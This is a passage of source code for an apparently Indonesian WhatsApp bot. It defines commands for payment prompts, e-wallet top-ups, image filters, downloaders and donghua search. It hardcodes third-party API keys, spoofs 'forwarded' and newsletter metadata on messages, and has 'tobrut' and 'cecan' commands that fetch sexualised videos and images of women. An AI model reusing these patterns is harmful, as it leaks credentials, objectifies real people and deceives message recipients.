          ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/72b973058c1985de0eda8.jpg' } }, { upload: Al.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: "𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭",
          hasMediaAttachment: false
        }),
                    body: { text: `${sopanDong} Kak 👋\n> ᴄʟɪᴄᴛ ʙᴜᴛᴛᴏɴ ɢᴏᴘᴀʏ ᴅɪʙᴀᴡᴀʜ\n𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰 𝚄𝙽𝚃𝚄𝙺 𝙼𝙴𝙽𝙶𝙸𝚁𝙸𝙼 𝙱𝚄𝙺𝚃𝙸 𝙿𝙴𝙼𝙱𝙰𝚈𝙰𝚁𝙰𝙽`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_copy",
                 "buttonParamsJson": "{\"display_text\":\"𝙿𝙰𝚈𝙼𝙴𝙽𝚃 𝙶𝙾𝙿𝙰𝚈\",\"id\":\"123456789\",\"copy_code\":\"081999042372\"}"
              },
                      ],
                    },
                  },
                  {                   
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/72b973058c1985de0eda8.jpg' } }, { upload: Al.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: "𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭",
          hasMediaAttachment: false
        }),
                    body: { text: `${sopanDong} Kak 👋\n> ᴄʟɪᴄᴛ ʙᴜᴛᴛᴏɴ Qʀɪꜱ ᴅɪʙᴀᴡᴀʜ\n𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰 𝚄𝙽𝚃𝚄𝙺 𝙼𝙴𝙽𝙶𝙸𝚁𝙸𝙼 𝙱𝚄𝙺𝚃𝙸 𝙿𝙴𝙼𝙱𝙰𝚈𝙰𝚁𝙰𝙽`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"𝙿𝙰𝚈𝙼𝙴𝙽𝚃 𝚀𝚁𝙸𝚂\",\"url\":\"https://telegra.ph/file/72b973058c1985de0eda8.jpg\",\"merchant_url\":\"https://www.google.com\"}`
              },
                      ],
                    },
                  },                                    
                ],
                            messageVersion: 1,
                        },
                         contextInfo: {
                         mentionedJid: [m.sender],
                         forwardingScore: 999,
                         isForwarded: true,
                         forwardedNewsletterMessageInfo: {
                         newsletterJid: '120363232588171807@newsletter',
                         newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
                         serverMessageId: 143
                            }
                        }
                    }
                }
            },
        },
        {quoted: memek})
            await Al.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
}
break
case 'topup-dana': {
let [nomor, total] = text.split`|`
if (!text) return m.reply(`Example : Topup-dana number|amount\n\nExample : topup-dana 08xxxxxxx|10000`)
m.reply('Processing payments...')
try {
let res = await fetchJson(`https://api.neoxr.eu/api/topup-dana?number=${encodeURIComponent(nomor ? nomor : '')}&amount=${encodeURIComponent(total ? total : '')}`)
if (res.status && res.data) {
let hasil = res.data
let buffer = Buffer.from(hasil.qr_image, 'base64')
await Al.sendMessage(m.chat, { image: buffer, caption: `Id_Transaction: ${hasil.id}\nNumber: ${hasil.number}\nTotal_Amount: ${hasil.price_format}\nExpired At: ${hasil.expired_at}` }, { quoted: m })
}
} catch (err) {
console.log(err)
m.reply('An error occurred while processing the payment')
}
}
break
case 'topup-gopay': {
let [nomor, total] = text.split`|`
if (!text) return m.reply(`Example : Topup-gopay number|amount\n\nExample : topup-gopay 08xxxxxxx|10000`)
m.reply('Processing payments...')
try {
let res = await fetchJson(`https://api.neoxr.eu/api/topup-gopay?number=${encodeURIComponent(nomor ? nomor : '')}&amount=${encodeURIComponent(total ? total : '')}`)
if (res.status && res.data) {
let hasil = res.data
let buffer = Buffer.from(hasil.qr_image, 'base64')
await Al.sendMessage(m.chat, { image: buffer, caption: `Id_Transaction: ${hasil.id}\nNumber: ${hasil.number}\nTotal_Amount: ${hasil.price_format}\nExpired At: ${hasil.expired_at}` }, { quoted: m })
}
} catch (err) {
console.log(err)
m.reply('An error occurred while processing the payment')
}
}
break
case 'topup-ovo': {
let [nomor, total] = text.split`|`
if (!text) return m.reply(`Example : Topup-ovo number|amount\n\nExample : topup-ovo 08xxxxxxx|10000`)
m.reply('Processing payments...')
try {
let res = await fetchJson(`https://api.neoxr.eu/api/topup-ovo?number=${encodeURIComponent(nomor ? nomor : '')}&amount=${encodeURIComponent(total ? total : '')}`)
if (res.status && res.data) {
let hasil = res.data
let buffer = Buffer.from(hasil.qr_image, 'base64')
await Al.sendMessage(m.chat, { image: buffer, caption: `Id_Transaction: ${hasil.id}\nNumber: ${hasil.number}\nTotal_Amount: ${hasil.price_format}\nExpired At: ${hasil.expired_at}` }, { quoted: m })
}
} catch (err) {
console.log(err)
m.reply('An error occurred while processing the payment')
}
}
break
        case 'cecanindo': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()        
            await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan indo`)
result = anu[Math.floor(Math.random() * anu.length)]
Al.sendMessage(from, {image: { url: result }, caption: 'nih sayang 😋'},{quoted:m})
}
limitAdd(m.sender, limit)
break
        case 'cecanchina': {
        if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
let { pinterest } = require('./lib/scraper')
anu = await pinterest(`cecan china`)
result = anu[Math.floor(Math.random() * anu.length)]
Al.sendMessage(from, {image: { url: result }, caption: 'nih sayang 😋'},{quoted:m})
}
limitAdd(m.sender, limit)
break
case 'tobrut1':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=https://vt.tiktok.com/ZSFFxoEuw/`).then(({ data }) => {
Al.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`lydia 🤤` })
})
limitAdd(m.sender, limit)
break
case 'tobrut2':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=https://vt.tiktok.com/ZSFFxWBJU/`).then(({ data }) => {
Al.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`Tokyo aku mau 🤤` })
})
limitAdd(m.sender, limit)
break
case 'tobrut3':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=https://vt.tiktok.com/ZSFFQrA7F/`).then(({ data }) => {
Al.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
})
limitAdd(m.sender, limit)
break
case 'tobrut4':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=https://vt.tiktok.com/ZSFFQHtLQ/`).then(({ data }) => {
Al.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
})
limitAdd(m.sender, limit)
break
case 'tobrut5':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=https://vt.tiktok.com/ZSFFQp8t7/`).then(({ data }) => {
Al.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
})
limitAdd(m.sender, limit)
break
case 'tobrut6':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await loading()
axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=https://vt.tiktok.com/ZSFFQXyGX/`).then(({ data }) => {
Al.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
})
limitAdd(m.sender, limit)
break
case 'toanime1': case 'jadianime1': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator&&!isPremium) return m.reply('Premium Only')
if (!quoted) return m.reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return m.reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})
const media = await Al.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
Al.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/imagetoanime?apikey=haikalgans&img=${anu}` }, caption: 'Nih ☑️'}, { quoted: m})
}
break
case 'gimage':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`Usage: ${prefix}gimage sby garuk biji`);
Al.sendMessage(m.chat, { react: { text: `💗`, key: m.key }})
let ini = await fetchJson(`https://widipe.com/googleimage?query=${q}`);
try{
for (let bing of ini.result) {
await sleep(200)
await Al.sendMessage(m.chat, { image: { url: bing }, caption: ``}, {quoted: m})
Al.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}
} catch (e) {
Al.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
}
}
break
case "jadinyata":
case "toreal": {
   if (!quoted) return reply(`Fotonya Mana?`);
  if (!/image/.test(mime)) return reply(`Kirim/Balas Foto dengan Caption ${prefix + command}`);
  reply(mess.wait);
  let tryng = 0;
  const media = await Al.downloadAndSaveMediaMessage(quoted);
  let pok = await TelegraPh(media);
    try {
    let ai = await fetch(`https://ai.xterm.codes/api/img2img/filters?action=anime2real&url=${pok}&key=OPSIONAL`).then(a => a.json());
      if (!ai.status) return ai;
  console.log(ai);
        while (tryng < 55) {
      let s = await fetch(`https://ai.xterm.codes/api/img2img/filters/batchProgress?id=${ai.id}`).then(a => a.json());
      if (s.status === 1) {
      console.log("Starting...");
    } 
     if (s.status === 2) {
      console.log("Processing...");
    } 
      if (s.status == 3) {
        return Al.sendMessage(m.chat, { image: { url: s.url } }, { quoted: m });
      }
            if (s.status == 4) {
        return reply("Maaf terjadi kesalahan. Coba gunakan gambar lain!");
      }
            await new Promise(resolve => setTimeout(resolve, 2000));
    }
  } catch (e) {
    console.error(e);
    reply(`Type-Err! :\n${e}`);
  }
}
break;
case 'lorasearch': {
    if (!q) return reply(`Example ${prefix + command} Donghua`)

    fetch("https://ai.xterm.codes/api/text2img/stablediffusion/list_loras")
        .then(async a => {
            let data = await a.json()
            let searchResults = data.map((b, index) => ({ index, item: b.model }))
                .filter(d => d.item.toLowerCase().includes(q.toLowerCase()))
            
            let txt = "*[ LORAS ]*\n"
            txt += "- Found: `" + searchResults.length + "`\n"
            txt += "_Of the total " + data.length + " model_\n\n- Type *.loracheckpoint ID* to see details\n"
            txt += "--------------------------------------------------------\n[ `ID` ] | `NAME`\n--------------------------------------------------------\n"
            searchResults.forEach(d => {
                txt += "[ `" + d.index + "` ] => " + d.item + "\n"
            })
            reply(txt)
        })
}
break
case 'removebg': case 'nobg':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (!mime) return m.reply('Send Media Nya Kak')
let media = await q.download()
let url = await uploadImage(media)
m.reply(`_Process_`)
let anu = await fetch(`https://skizo.tech/api/removebg?apikey=nanogembul&url=${url}`);
let data = await anu.json()
await Al.sendFile(m.chat, data.url.result, 'anu.jpg', '_Succes Removing Background_', m)
}
limitAdd(m.sender, limit)
break
break
case 'jadianime': case'toanime':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (!mime) return m.reply('Send Media Nya Kak')
let media = await q.download()
let url = await uploadImage(media)
m.reply(`_Loading..._`)
let anu = await fetch(`https://api.junn4.my.id/ai/toanime?url=${url}`)
let data = await anu.json()
await Al.sendFile(m.chat, data.url, 'anu.jpg', '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', m)
}
limitAdd(m.sender, limit)
break
case 'jadizombi': case'tozombie':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (!mime) return m.reply('Send Media Nya Kak')
let media = await q.download()
let url = await uploadImage(media)
m.reply(`_Loading..._`)
let anu = await fetch(`https://widipe.com/converter/zombie?url=${url}`);
let data = await anu.json()
await Al.sendFile(m.chat, data.url, 'anu.jpg', '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~', m)
}
limitAdd(m.sender, limit)
break
case'nulis1':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
m.reply(`*Pilihan Fitur Nulis*
1. ${prefix}nuliskiri
2. ${prefix}nuliskanan
3. ${prefix}foliokiri
4. ${prefix}foliokanan

Contoh:
${prefix}nuliskiri 𝙈𝘼𝙉𝙐𝙇 keren abis`)
break
case'nuliskiri': {
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} 𝙈𝘼𝙉𝙐𝙇?`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}
  })   
const tulisan = body.slice(11)
Al.sendMessage(m.chat, {image:{url:`https://api.zeeoneofc.my.id/api/canvas/${command}?apikey=y78GzVZCjtLIVri&text=${q}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await m.reply("Apikey Belum Ada"))
}
limitAdd(m.sender, limit)
break
case'nuliskanan': {
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} 𝙈𝘼𝙉𝙐𝙇?`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})   
const tulisan = body.slice(12)
Al.sendMessage(m.chat, {image:{url:`https://api.zeeoneofc.my.id/api/canvas/${command}?apikey=y78GzVZCjtLIVri&text=${q}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await m.reply("Apikey Belum Ada"))
}
limitAdd(m.sender, limit)
break
case'foliokiri': {
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} 𝙈𝘼𝙉𝙐𝙇?`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}
  })   
const tulisan = body.slice(11)
Al.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=y78GzVZCjtLIVri`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await m.reply("Apikey Belum Ada"))
}
limitAdd(m.sender, limit)
break
case'foliokanan': {
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} 𝙈𝘼𝙉𝙐𝙇?`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}
  })   
const tulisan = body.slice(12)
Al.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=y78GzVZCjtLIVri`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await m.reply("Apikey Belum Ada"))
}
limitAdd(m.sender, limit)
break
case 'lirik':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})   
if(!text) return m.reply('*Nyari Lagu Apa*')
let anu = await fetchJson(`https://api.zenext.xyz/searching/liriklagu?query=${text}&apikey=zenzkey_3902eee9616b`)
const lagune = anu.result
Al.sendMessage(m.chat, {text: lagune}, {quoted: m})
let search = await yts(`${text}`)
let data = await search.all.filter((v) => v.type == 'video')
try {
var res12 = data[0]
} catch {
var res12 = data[1]
}
let ply = search.videos[0].url
const ytdl = require('ytdl-core')
let mp3file = `./${m.chat}.mp3`
  let nana = ytdl(ply, { filter: 'audioonly' })
  .pipe(fs.createWriteStream(mp3file))
  .on('finish', async () => {
Al.sendMessage(m.chat, {audio: fs.readFileSync(mp3file), mimetype: 'audio/mpeg', contextInfo: {externalAdReply: {title: `${search.all[0].title}`, body: `Views : ${search.all[0].views}`, thumbnailUrl: res12?.thumbnail, mediaType: 2, mediaUrl: `${search.videos[0].url}`, sourceUrl: `${search.videos[0].url}`, renderLargerThumbnail: true }}},)
   })
await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})      
}
limitAdd(m.sender, limit)
break
case 'remini': case 'hd': case 'hdr': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!quoted) return m.reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return m.reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})   
let media = await quoted.download()
let proses = await remini(media, "enhance");
Al.sendMessage(m.chat, { image: proses, caption: '*හායි යාලුවනේ...👋😇*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n*✨මගෙ චැනල් එකට Join වෙන්න...💗*\n https://whatsapp.com/channel/0029VaN1XMn2ZjCsu9eZQP3R\n\n -𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥~'}, { quoted: m})
}
limitAdd(m.sender, limit)
break
case 'capcut':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Masukan Link Nya\nexemple\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
try{  
let anu = await fetchJson(`https://widipe.com/download/capcut?url=${text}`)
Al.sendMessage(m.chat, { video: { url: anu.result.video_ori}, caption: `Nih`}, {quoted: m})
await Al.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await Al.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
limitAdd(m.sender, limit)
break
case 'linkgrup': case 'linkgroup': case 'linkgc': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isBotAdmins) return m.reply('Saya bukan Admin grup!')
let responsee = await Al.groupInviteCode(m.chat)
Al.sendText(m.chat, `https://chat.whatsapp.com/${responsee}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'gddl': case 'gdrivedl': case 'gdrive':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}
  })   
const {
					sizeFormatter
				} = await import('human-readable')
				let formatSize = sizeFormatter({
					std: 'JEDEC',
					decimalPlaces: 2,
					keepTrailingZeroes: false,
					render: (literal, symbol) => `${literal} ${symbol}B`
				})
				async function GDriveDl(url) {
					let id
					if (!(url && url.match(/drive\.google/i))) return m.reply('Invalid URL')
					id = (url.match(/\/?id=(.+)/i) || url.match(/\/d\/(.*?)\//))[1]
					if (!id) return m.reply('ID Not Found')
					let res = await fetch(`https://drive.google.com/uc?id=${id}&authuser=0&export=download`, {
						method: 'post',
						headers: {
							'accept-encoding': 'gzip, deflate, br',
							'content-length': 0,
							'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
							'origin': 'https://drive.google.com',
							'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
							'x-client-data': 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=',
							'x-drive-first-party': 'DriveWebUi',
							'x-json-requested': 'true'
						}
					})
					let {
						fileName,
						sizeBytes,
						downloadUrl
					} = JSON.parse((await res.text()).slice(4))
					if (!downloadUrl) return m.reply('Link Download Limit!')
					let data = await fetch(downloadUrl)
					if (data.status !== 200) return m.reply(data.statusText)
					return {
						downloadUrl,
						fileName,
						fileSize: formatSize(sizeBytes),
						mimetype: data.headers.get('content-type')
					}
				}
				await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}
  })   
				await sleep(100)
				if (!text) return invalid(precom + ' https://drive.google.com/72jshshehk')
				GDriveDl(args[0]).then(async (res) => {
					if (!res) m.reply(res)
					await m.reply(JSON.stringify(res, null, 2))
					Al.sendMessage(m.chat, {
						document: {
							url: res.downloadUrl
						},
						fileName: res.fileName,
						mimetype: res.mimetype,
						contextInfo:
						{
							"externalAdReply": {
								"title": namabot,
								"body": ``,
								previewType: "PHOTO",
								showAdAttribution: true,
								sourceUrl: '',
								thumbnailUrl: thumb
							}
						}
					}, {
						quoted: m
					})
				})
}
limitAdd(m.sender, limit)
break
case 'donghua': {   
    if (!text) return m.reply(`Example : ${prefix + command} Soul Land`);      
    try {        
        let res = await fetch(`https://api.alyachan.dev/api/donghua?q=${text}&apikey=APIKEYKAMU`);
        let json = await res.json();
        if (json.status && json.data.length > 0) {
            let sections = json.data.slice(0, 10).map(donghua => {
                // Mengubah URL di sini
                let updatedUrl = donghua.url.replace('https://tv1.ichinime.net', 'https://tv1.ichinime.net');
                return {
                    title: donghua.title,
                    rows: [
                        {
                            title: 'SEE DETAILS',
                            description: `click to see detail "${donghua.title}"`,
                            id: `.detaildonghua ${updatedUrl}`
                        },
                        {
                            title: 'WATCH NOW',
                            description: `click to watch "${donghua.title}"`,
                            id: `.streamingdonghua ${updatedUrl}`
                        }
                    ]
                };
            });

            let listMessage = {
                title: 'TAP HERE',
                sections
            };

            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                mentionedJid: [m.sender],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363232588171807@newsletter',
                                    newsletterName: '   - ',
                                    serverMessageId: -1
                                },
                                businessMessageForwardInfo: { businessOwnerJid: Al.decodeJid(Al.user.id) },
                                forwardingScore: 256,
                                externalAdReply: {
                                    title: '  ',
                                    thumbnailUrl: json.data[0].thumbnail, // gunakan thumbnail dari film pertama
                                    sourceUrl: json.data[0].url.replace('https://tv1.ichinime.net', 'https://tv1.ichinime.net'), // gunakan URL dari film pertama
                                    mediaType: 2,
                                    renderLargerThumbnail: false
                                }
                            },
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `Your search was successful! Select a search result from the menu below`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "©  "
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                subtitle: "Hasil_Pencarian",
                                hasMediaAttachment: false//,
                                //...(await prepareWAMessageMedia({ image: { url: json.data[0].thumbnail } }, { upload: LorenzoBotInc.waUploadToServer }))
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify(listMessage)
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { quoted: m });

            Al.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        } else {
            m.reply('Donghua not found');
        }
    } catch (error) {
        console.error(error);
        m.reply('error');
    }
 }
break
case 'detaildonghua': {
if (!/https?:\/\/(www\.)?tv1.ichinime\.net/i.test(args[0])) return m.reply(`Example : ${prefix + command} url`)
try {
let res = await fetchJson(`https://api.alyachan.dev/api/donghua-get?url=${args[0]}&type=detail&apikey=APIKEYKAMU`)
if (res.status && res.data) {
let hasil = res.data
let teks = `
Title: *${hasil.title}*

Type: ${hasil.type}
Release Date: ${hasil.release}
Genre: ${hasil.genre}
Duration: ${hasil.duration}
Studio: ${hasil.studio}
Season: ${hasil.season}

Description: ${hasil.sinopsis}`
await Al.sendMessage(m.chat, {
text: teks,
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
title: "Donghua-Detail",
thumbnailUrl: hasil.thumbnail,
sourceUrl: `${text}`,
mediaType: 1,
renderLargerThumbnail: true
}}
},{
quoted: m
})
}
console.log(res)
} catch (err) {
console.log(err)
m.reply('error')
}
}
break
case 'streamingdonghua': {
    if (!text) return m.reply(`Example : ${prefix + command} url`);
    try {
        let res = await fetch(`https://api.alyachan.dev/api/donghua-get?url=${args[0]}&type=detail&apikey=APIKEYKAMU`);
        let result = await res.json();
        if (result.status && result.data && result.data.episodes.length > 0) {
            let episodes = result.data.episodes;

            let episodeButtons = episodes.map((episode) => ({
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                    display_text: `Streaming Episode ${episode.episode} (${episode.title})`,
                    url: episode.url,
                    merchant_url: episode.url
                })
            }));

            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                mentionedJid: [m.sender],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363232588171807@newsletter',
                                    newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
                                    serverMessageId: -1
                                },
                            },
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: 'Here are your donghua streaming results. Select the episode you want to watch:'
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: "© 𝐌𝐚𝐧𝐮 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭"
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: `Hello *@${m.sender.split('@')[0]}* ðŸ‘‹`,
                                subtitle: "ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙",
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: episodeButtons
                            })
                        })
                    }
                }
            }, { quoted: m });

            Al.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: m.key.id
            });
        } else {
            m.reply('No episode found');
        }
    } catch (err) {
        console.log(err);
        m.reply('error');
    }
}
break
case 'donghua': {   
    if (!text) return m.reply(`Example : ${prefix + command} Soul Land`);      
    try {        
        let res = await fetch(`https://api.alyachan.dev/api/donghua?q=${text}&apikey=APIKEYKAMU`);
        let json = await res.json();
        if (json.status && json.data.length > 0) {
            let sections = json.data.slice(0, 10).map(donghua => {
                // Mengubah URL di sini
                let updatedUrl = donghua.url.replace('https://tv1.ichinime.net', 'https://tv1.ichinime.net');
                return {
                    title: donghua.title,
                    rows: [
                        {
                            title: 'SEE DETAILS',
